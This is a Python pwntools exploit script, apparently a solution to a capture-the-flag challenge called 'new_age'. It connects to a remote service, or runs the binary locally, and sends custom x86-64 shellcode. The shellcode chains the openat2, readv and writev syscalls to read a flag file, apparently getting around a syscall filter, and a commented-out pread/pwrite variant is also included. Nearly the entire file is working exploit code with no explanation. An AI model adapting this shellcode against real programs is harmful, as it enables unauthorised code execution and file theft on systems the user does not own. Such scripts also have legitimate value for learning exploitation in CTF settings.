#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('new_age', checksec=False)
# libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+204

        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('159.89.106.147', 1337)
else:
    p = process([exe.path])
GDB()


"""
flag_nam
e_Should
_Be_R@nd
om_ahaha
hahahaha
hahah.txt
"""
path = "flag_name_Should_Be_R@ndom_ahahahahahahahahah.txt"
shellcode = asm(
    # openat2 --> readv --> writev
    f"""
    mov rdi, -100
    push 0
    push 0
    push 0
    mov rdx, rsp
    mov r10, 24
    {shellcraft.pushstr(path)}
    mov rsi, rsp
    mov rax, 437
    syscall

    mov rdi, rax
    mov rsi, rsp
    push 0x50
    push rsi
    mov rdx, 1
    mov rsi, rsp
    mov rax, 19
    syscall

    mov rdi, 1
    mov rax, 20
    syscall

    """
)
"""
    
"""

"""
mov rdi, rax
    mov rdx, 0x50
    xor r10, r10
    mov rax, 17
    syscall

    mov rdi, 1             
    mov rax, 18             
    syscall
"""

sa(b'ytes): \n', shellcode)

p.interactive()
